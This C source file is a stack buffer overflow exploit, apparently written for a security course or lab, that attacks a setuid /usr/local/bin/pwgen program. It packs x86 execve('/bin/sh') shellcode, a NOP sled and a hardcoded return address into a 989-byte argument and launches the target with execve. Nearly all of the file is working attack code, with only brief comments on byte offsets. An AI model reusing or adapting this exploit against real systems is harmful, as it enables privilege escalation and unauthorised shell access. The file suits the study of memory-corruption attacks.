#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h> 

#define NOP 0x90 
int main(int argc, char *argv[]){
    static char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh"; // 45 chars 

    char *shellcode_address = "\xa4\xd4\xbf\xff\0";
    char *new_env[] = { NULL };
    char buff[989]; // 1024 - 44 + 8 (+ 1 for the \0)// this is still < BUFF_SZ which is the limit at strncat
    char *new_argv[] = {buff, NULL};
    char *ptr; 
    int i; 

    ptr = buff; 

    // insert shellcode 
    memcpy(ptr, shellcode, strlen(shellcode));

    // insert NOPs 
    for(i=45; i<980; i++){
        buff[i] = NOP; 
    }
    // insert into memory address that has the old FP
    for (i=980; i<984; i++){
        buff[i] = NOP; 
    }

    // insert desired RA 
    ptr = &buff[984]; 
    memcpy(ptr, shellcode_address, 5);
    
    if (execve("/usr/local/bin/pwgen", new_argv, new_env) == -1) {
            perror("execve");
            return 1;
        }


    return 0; 
    


}